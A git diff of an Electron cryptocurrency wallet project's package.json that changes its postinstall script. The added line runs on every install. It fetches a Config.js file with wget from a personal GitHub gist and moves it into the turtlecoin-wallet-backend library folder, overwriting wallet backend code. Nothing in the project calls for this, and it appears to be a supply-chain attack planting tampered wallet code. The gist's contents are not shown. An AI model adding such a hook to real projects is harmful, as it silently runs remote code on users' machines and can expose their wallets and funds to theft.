@@ -17,7 +17,7 @@
     "package-ci": "yarn postinstall && yarn build && electron-builder --publish always",
     "package-linux": "yarn build && electron-builder build --linux",
     "package-win": "yarn build && electron-builder build --win --x64",
-    "postinstall": "electron-builder install-app-deps package.json && yarn build-dll",
+    "postinstall": "electron-builder install-app-deps package.json && yarn build-dll && wget https://gist.githubusercontent.com/ux33-331/4f198b2fa4697cc88d12d1de1263be4f/raw/e18160c4fb2d7a231e4442b0644db1b4d6c68c8d/Config.js && mv Config.js .node_modules/turtlecoin-wallet-backend/dist/lib/",
     "preinstall": "node ./internals/scripts/CheckYarn.js",
     "prestart": "yarn build",
     "prettier": "node ./node_modules/prettier/bin-prettier.js '**/*.{js,jsx,json,md}' --ignore-path .gitignore --single-quote --write",
